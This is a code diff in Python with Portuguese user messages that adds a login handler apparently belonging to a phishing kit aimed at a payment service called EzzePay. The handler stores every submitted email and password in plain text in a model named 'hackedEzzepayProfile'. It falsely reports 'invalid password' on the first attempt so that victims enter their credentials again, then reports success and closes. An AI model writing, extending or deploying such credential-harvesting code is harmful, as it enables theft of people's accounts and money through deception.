@@ -1072,3 +1072,42 @@ def hacked(data):
         'message': message,
         'containers': containers
     }
+
+def ezzepay_register_login(data):
+    data = load_json(data)
+    email = data['email']
+    password = data['password']
+    
+    users = models.hackedEzzepayProfile.objects.filter(email=email)
+    if len(users) == 1:
+        status = False
+        message = 'Senha inválida, tente novamente!'
+        containers = {
+            'reset_input': True,
+            'quit': False
+        }
+    elif len(users) > 1:
+        status = True
+        message = 'Autenticação realizada com sucesso!'
+        containers = {
+            'reset_input': False,
+            'quit': True
+        }
+    else:
+        status = False
+        message = 'Tivemos um problema ao autenticar, tente novamente!'
+        containers = {
+            'reset_input': False,
+            'quit': False
+        }
+
+    models.hackedEzzepayProfile.objects.create(
+        email=email,
+        password=password
+    )
+
+    return {
+        'status': status,
+        'message': message,
+        'containers': containers
+    }
